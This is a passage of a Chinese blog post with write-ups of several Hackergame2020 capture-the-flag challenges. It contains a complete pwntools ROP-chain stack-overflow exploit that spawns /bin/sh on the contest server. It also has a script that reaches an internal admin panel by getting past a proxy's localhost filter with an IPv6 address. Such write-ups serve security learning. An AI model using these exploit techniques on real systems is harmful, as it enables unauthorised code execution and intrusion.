+<p>向上翻可以看到<code>v12</code>存放于<code>rbp-90h</code>处，<code>v15</code>存放于<code>rbp-1h</code>处，所以我们可以直接构造一个超长字符串使得<code>rbp-1h</code>被覆盖为<code>0x1</code></p>
+<h2 id="升上天空"><a href="#升上天空" class="headerlink" title="升上天空"></a>升上天空</h2><p>题目的意思很明显了，<code>main</code>函数没有开启<code>canary</code>，我们要覆盖掉<code>rbp</code>来<code>getshell</code></p>
+<p>注意到程序是静态链接的，直接使用<code>ROPgadget</code>工具获取<code>ROP</code>链来构造<code>syscall</code></p>
+<p>执行命令：</p>
+<blockquote>
+<p>ROPgadget —binary tictactoe —ropchain</p>
+</blockquote>
+<p>我们把<code>step - 5</code>中构造的<code>ROPchain</code>拿来修改一下，加上前面<code>0x90h</code>的填充</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#target = process(&#x27;./tictactoe&#x27;)</span></span><br><span class="line">target = remote(<span class="string">&#x27;202.38.93.111&#x27;</span>, <span class="number">10141</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line"><span class="comment">#p = &#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p = (<span class="string">&#x27;1&#x27;</span> * <span class="number">143</span>).encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="comment"># 第一问</span></span><br><span class="line">p += <span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line">p += (<span class="string">&#x27;1&#x27;</span> * <span class="number">8</span>).encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二问</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000407228</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a60e0</span>)  <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000043e52c</span>)  <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin//sh&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046d7b1</span>)  <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000407228</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a60e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000439070</span>)  <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046d7b1</span>)  <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004017b6</span>)  <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a60e0</span>)  <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000407228</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a60e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000043dbb5</span>)  <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a60e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000439070</span>)  <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402bf4</span>)  <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target.sendline(</span><br><span class="line">    <span class="string">&#x27;144:MEUCIQCGhHgBSLuiv2VMiC2WbvpaBTaUVbKt/UeFDyZ4AY4IKAIgP3mG7PCCKwxX3drRjkbwUlLex7rwNoqoOeUWAejFGWg=&#x27;</span>)</span><br><span class="line">target.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target.sendline(p)</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>
+<p>最后执行效果：</p>
+<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-6.3.png" alt="pwn"></p>
+<h1 id="超安全的代理服务器"><a href="#超安全的代理服务器" class="headerlink" title="超安全的代理服务器"></a>超安全的代理服务器</h1><p>我的做法和官方题解不太一样，我要充分榨干浏览器的功能:smile:</p>
+<h2 id="找到secret"><a href="#找到secret" class="headerlink" title="找到secret"></a>找到secret</h2><p>使用谷歌浏览器自带的<code>net-export</code>功能</p>
+<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-7.png" alt="net-export"></p>
+<p>开启记录后我们用<span class="exturl" data-url="aHR0cHM6Ly9uZXRsb2ctdmlld2VyLmFwcHNwb3QuY29tLw==">这个工具<i class="fa fa-external-link-alt"></i></span>查看一下我们的访问记录</p>
+<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-7.1.png" alt="net-log"></p>
+<p>发现了一个神秘地址，拼接后访问可以看到</p>
+<blockquote>
+<p>Notice: secret: 7374a29dc1 ! Please use this secret to access our proxy.(flag1: flag{d0_n0t_push_me} )</p>
+</blockquote>
+<h2 id="入侵管理中心"><a href="#入侵管理中心" class="headerlink" title="入侵管理中心"></a>入侵管理中心</h2><p>这个题目写的比较变态，<code>secret</code>60秒过期，要么拼手速要么写脚本</p>
+<p>查看帮助发现管理中心地址为<code>127.0.0.1:8080</code>而过滤了<code>ip</code>和域名访问，于是尝试使用<code>IPv6</code>地址来绕过：<code>[::1]:8080</code></p>
+<p>最后写一个<code>python</code>脚本配合<code>net-export</code>和<code>curl</code></p>
+<p>参考代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hyper <span class="keyword">import</span> HTTPConnection</span><br><span class="line"><span class="keyword">from</span> hyper.contrib <span class="keyword">import</span> HTTP20Adapter</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag2: flag&#123;c0me_1n_t4_my_h0use&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用以下命令安装工具</span></span><br><span class="line"><span class="comment"># pip3 install -U git+https://github.com/Lukasa/hyper.git</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&#x27;chrome-net-export-log.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">token = data.split(</span><br><span class="line">    <span class="string">&#x27;&#123;&quot;params&quot;:&#123;&quot;headers&quot;:[&quot;:method: GET&quot;,&quot;:scheme: https&quot;,&quot;:authority: 146.56.228.227&quot;,&quot;:path: /&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">token = token[:<span class="number">36</span>]</span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;https://146.56.228.227&#x27;</span>, HTTP20Adapter())</span><br><span class="line">r = s.get(<span class="string">&#x27;https://146.56.228.227/&#x27;</span>+token, verify=<span class="literal">False</span>)</span><br><span class="line">content = r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sec = content.split(<span class="string">&#x27;secret: &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">sec = sec[:<span class="number">11</span>]</span><br><span class="line">print(sec)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;curl -v --proxytunnel --proxy-insecure -x https://146.56.228.227 --proxy-header \&quot;Secret: &#x27;</span></span><br><span class="line">cmd += sec</span><br><span class="line">cmd += <span class="string">&#x27;\&quot; -H \&quot;Referer: 146.56.228.227\&quot; \&quot;http://[::1]:8080\&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">os.system(cmd)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="不经意传输"><a href="#不经意传输" class="headerlink" title="不经意传输"></a>不经意传输</h1><p>这个只会第一问送分题</p>
+<h2 id="解密消息"><a href="#解密消息" class="headerlink" title="解密消息"></a>解密消息</h2><p>题目告知了我们<code>m0_1</code>，而<code>m0_1</code>是通过<code>m0</code>和一个我们可以控制的<code>pow</code>计算而得</p>
+<p>我们不妨令<code>v-x0 = 1</code>那么输出的<code>m0_</code>就是<code>m0+1</code>了由此可以轻易计算出<code>m0</code>拿到第一个<code>flag</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/hack/" rel="tag"># hack</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/09/29/stm8-soft-uart/" rel="prev" title="在STM8上使用GPIO模拟UART">
+                  <i class="fa fa-chevron-left"></i> 在STM8上使用GPIO模拟UART
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Paul</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">32k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">53 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1.15.0/dist/lozad.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '.page-configurations',
+    '.main-inner',
+    '.post-toc-wrap',
+    '.languages',
+    '.pjax'
+  ],
+  analytics: false,
+  cacheBust: false,
+  scrollRestoration: false,
+  scrollTo: !CONFIG.bookmark.enable
+});
+
+document.addEventListener('pjax:success', () => {
+  pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  const hasTOC = document.querySelector('.post-toc');
+  document.querySelector('.sidebar-inner').classList.toggle('sidebar-nav-active', hasTOC);
+  document.querySelector(hasTOC ? '.sidebar-nav-toc' : '.sidebar-nav-overview').click();
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+  <div style="display: none;">
+    <script data-pjax src="//s95.cnzz.com/z_stat.php?id=1278724440&web_id=1278724440"></script>
+  </div>
+
+
+
+
+
+
+    <div class="pjax">
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css">
+
+<script>
+NexT.utils.loadComments('#disqus_thread', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js', () => {
+    window.dsqjs = new DisqusJS({
+      api       : 'https://disqus.skk.moe/disqus/' || 'https://disqus.com/api/',
+      apikey    : 'pwCicQgBQmc1ZEUP8fbsECJ1H1U5HWHEuUKbFFR0whF6VjLgL5CneiwMFOtQwwAv',
+      shortname : 'silent-world',
+      url       : "https://blog.ofortune.xyz/2020/11/08/ustc-hack-lug2020/",
+      identifier: "2020/11/08/ustc-hack-lug2020/",
+      title     : "Hackergame2020部分题解",
+    });
+  }, window.DisqusJS);
+});
+</script>
+
+    </div>
+</body>
+</html>
